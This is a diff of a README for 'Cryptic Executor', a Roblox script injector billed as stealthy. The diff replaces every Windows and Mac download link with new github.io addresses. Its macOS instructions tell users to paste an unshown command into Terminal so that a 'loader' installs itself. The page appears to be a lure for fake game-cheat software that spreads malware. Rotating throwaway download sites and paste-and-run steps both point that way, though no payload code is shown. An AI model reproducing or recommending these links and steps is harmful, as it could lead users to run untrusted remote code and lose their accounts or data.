@@ -10,8 +10,8 @@ Cryptic Executor is built for stealth — minimal footprint, no persistent proce
 
 <div align="center">
 
-[![Download Cryptic Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download Cryptic Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
 
 </div>
 
@@ -41,14 +41,14 @@ Cryptic Executor is built for stealth — minimal footprint, no persistent proce
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CRYPTIC%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CRYPTIC%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 ### 🍎 macOS
 1. Press `⌘ + Space`, type **Terminal**, hit Enter
 2. Paste the command and press Enter
 3. Follow the prompts — the loader installs automatically
 
-[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
 
 ---
 
@@ -84,5 +84,5 @@ Cryptic Executor is built for stealth — minimal footprint, no persistent proce
 
 ---
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CRYPTIC%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20CRYPTIC%20🔻-purple?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
